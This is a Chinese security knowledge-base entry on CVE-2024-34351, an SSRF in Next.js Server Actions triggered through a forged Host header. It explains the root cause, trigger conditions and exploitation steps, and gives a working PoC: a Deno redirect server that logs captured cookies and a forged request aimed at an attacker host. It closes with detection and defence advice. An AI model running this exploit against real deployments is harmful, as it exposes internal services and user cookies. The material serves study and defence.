---
id: web-nodejs-nextjs-server-action-host-header-ssrf
title: Next.js Server Actions 以 Host 头拼接内部请求：改 Host 指向攻击者后 302 跳内网，实现带 Next-Action 头的请求转发 SSRF（CVE-2024-34351）
type: scenario
domain: web
path: web/nodejs
technique: nextjs-server-action-host-header-ssrf
aliases:
- CVE-2024-34351
- Next.js Server Actions SSRF
- Host 头触发 Server Action SSRF
- x-action-redirect
- Next-Action 头伪造
- nextjs redirect ssrf
tags:
- nodejs
- nextjs
- ssrf
- host-header
- server-actions
- redirect
- cve
cve:
- CVE-2024-34351
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: 14.1.0
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:42:58+08:00'
  notes: '已对照原文核对：POST /success 携 Next-Action/Next-Router-State-Tree/multipart，改 Host 与 Origin 到攻击者地址后 Next.js 服务端先发 HEAD(Accept: text/x-component) 再发 GET 并跟随 302 到内网、Cookie 随行，均与原文图01与 Deno 日志一致；未验证点：affected_versions 仅按原文 package.json 的 14.1.0（目标环境版本），受影响区间与 14.1.1 修复点系通用公开信息，未逐版本核实'
---

## 一句话结论

Next.js 在处理 Server Action 的 redirect 结果时，会用请求的 `Host` 头拼出内部绝对 URL 再发起一次 HEAD/GET 请求取重定向目标；把 `Host` 改成攻击者地址后，Next.js 服务端就会把带 `Next-Action`、`Next-Router-State-Tree` 与受害者 Cookie 的请求发到攻击者，攻击者回 `302 Location: http://<内网地址>:<端口>/` 即可让 Next.js 继续向内网发起请求，形成能携带内部协议头与 Cookie 的 SSRF（CVE-2024-34351，原文实测 Next.js 14.1.0）。

## 原理

- **Server Action 需要"确认重定向"**：当 action 返回 `redirect(...)`（框架层生成 `x-action-redirect` 信息）时，Next.js 服务端要为客户端生成正确的 action 响应，其中一步是按当前请求的头构造一个"用于验证重定向"的内部请求；这一步把 `Host` 头当作可信来源，直接拼成 `http://<Host><path>`。
- **为什么 Host 可控是根因**：`Host` 来自客户端请求，反代/网关通常原样透传；Next.js 未把它与真实监听地址或配置的 `allowedOrigins` 绑定，于是"服务端自己发起的请求"的目的地由攻击者决定。这就是 CVE-2024-34351 的核心：服务端请求伪造（SSRF），而不是浏览器端跳转。
- **为什么要发 HEAD 再发 GET**：Next.js 先对被拼出的地址发 `HEAD`（带 `Accept: text/x-component`）来判断响应类型/是否 302；攻击者用 Deno/Node 起一个服务，对 `HEAD` 回 `Content-Type: text/x-component` 的空响应，对 `GET` 回 `302 Location: http://172.11.0.3:5000/`，Next.js 的 fetch 默认跟随重定向，于是第二次请求落到内网地址。
- **为什么危害不只是"打外网"**：请求里带 `Next-Action`（服务器 action ID）、`Next-Router-State-Tree`、`Content-Type: multipart/form-data; boundary=...` 以及浏览器 Cookie；内网服务若按这些头做路由/鉴权（例如只允许带特定内部头或同站 Cookie 的请求），该 SSRF 正好满足，能访问只对"内部调用"开放的路由。
- **为什么用 POST 到 /success**：原文前端有两个路由 `/play`（3 秒一题、10000 分才跳转）与 `/success`；`success` 页里调用了 `redirect("/play")`，且项目未加认证模块，直接访问 `/success` 就能触达这个 action 流程，无需真的玩到 10000 分。
- **边界与指纹**：`package.json` 里 `next` 版本落在受影响区间即具备条件；请求需要 `Next-Action` 头（可从页面 JS 或已知 action ID 获得）、`Accept: text/x-component`，POST body 为 multipart；响应中若出现 `x-action-redirect`、`Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch` 说明走的是 Server Action 通道。

## 触发条件

- 目标使用 Next.js 且版本处于 CVE-2024-34351 受影响区间（原文靶场 `package.json` 为 14.1.0）。
- 应用存在 Server Action，且该 action 会走到 `redirect(...)`；攻击者能拿到可用的 `Next-Action` ID（页面 JS、常见 action 枚举或公开 PoC）。
- `Host` 头未被反代重写、未被 Next.js 的 `allowedOrigins`/`serverActions.allowedOrigins` 限制。
- 攻击者能提供一个可被目标访问的服务（用于 HEAD 应答与 302 跳转），且目标可向内网目标地址发起连接。

## 利用步骤

1. 指纹：读页面 JS 找到 `next` 版本与 action ID（`Next-Action` 值），或直接访问疑似 action 路由。
2. 在可被目标访问的主机上起恶意服务：`HEAD` 返回 `Content-Type: text/x-component` 空响应；`GET` 返回 `302` 且 `Location` 指向要打的内网地址。
3. 用 Burp 抓一条正常的 Server Action 请求（`POST /success`、`Accept: text/x-component`、`Next-Action`、multipart body），把 `Host` 与 `Origin` 都改成恶意服务地址后重放。
4. 观察恶意服务日志：若先收到 `HEAD`（带 `Accept: text/x-component`）再收到 `GET`（带 `Next-Action`、Cookie），说明 Next.js 已按 Host 发起请求并跟随 302。
5. 把 `Location` 换成内网服务地址（如 `http://172.11.0.3:5000/`、Redis/管理端口）继续探测；内网服务若回显内容，会经 Next.js 的 action 响应带回。
6. 若内网目标是 Redis 等非 HTTP 服务，此路径只到"TCP 连接/单请求"层，需要再配合该服务的协议特性（如需任意字节则换其他 gadget）。

## PoC

恶意服务（Deno，最小化）：

```ts
Deno.serve({ hostname: "0.0.0.0", port: 8000 }, (request: Request) => {
  console.log(JSON.stringify({
    url: request.url,
    method: request.method,
    headers: Array.from(request.headers.entries()),
  }));
  if (request.method === "HEAD") {
    return new Response(null, { headers: { "Content-Type": "text/x-component" } });
  }
  if (request.method === "GET") {
    return new Response(null, { status: 302, headers: { Location: "http://172.11.0.3:5000/" } });
  }
  return new Response("ok");
});
```

```bash
deno run --allow-net main.ts
```

重放的请求（关键改动是 `Host` 与 `Origin`）：

```http
POST /success HTTP/1.1
Host: <attacker-vps>:8000
Accept: text/x-component
Next-Action: <action-id>
Next-Router-State-Tree: <从正常请求复制的值>
Content-Type: multipart/form-data; boundary=----<boundary>
Origin: http://<attacker-vps>:8000

------<boundary>
Content-Disposition: form-data; name="1_$ACTION_ID_<action-id>"

------<boundary>
Content-Disposition: form-data; name="0"

["$K1"]
------<boundary>--
```

## 变体与关联

- 变体：`Location` 可指向任意内网 HTTP 服务（后端 API、管理面板、MinIO/Consul 等），也可指向同一应用的不同路由以触发二次 action。
- 变体：若目标限制了 `Host`，尝试 `X-Forwarded-Host`、`Forwarded` 或反代配置错误下的多级 Host；Next.js 若配置了 `serverActions.allowedOrigins` 则需找绕过（子域、端口、大小写）。
- 关联：[[web-generic-ssrf-host-header-routing-ssrf]]（Host 头被负载均衡用于路由的同类思路）、[[web-generic-ssrf-redis-inline-protocol-crlf]]（把 SSRF 接到 Redis 后的协议层利用）、[[web-nodejs-nextjs-middleware-subrequest-auth-bypass-cve-2025-29927]]（同为 Next.js 版本相关缺陷）。
- 边界：升级到修复版本（Next.js 在 14.1.1 之后修复该问题）、把 `Host` 在反代层重写为固定值、启用 `serverActions.allowedOrigins` 白名单、或目标无法访问攻击者服务时，链不成立。

## 检测与防御

- 升级：把 Next.js 升到不受 CVE-2024-34351 影响的版本；`package.json`/`next` 版本纳入依赖巡检。
- 配置：显式设置 `experimental.serverActions.allowedOrigins` 只允许本站域名；反代层强制重写 `Host`（不要透传客户端 Host），并校验 `Origin`。
- 网络：限制应用进程出站到非业务地址；内网服务不要仅凭"来自同站"或内部头就放行。
- 检测：请求中 `Host` 与 `Origin` 指向外部域、`Next-Action` 头出现但来源 IP 异常、应用进程向外部主机发起 HEAD/GET、随后向内部非常用端口发起连接；响应中出现 `x-action-redirect` 与外部域组合。
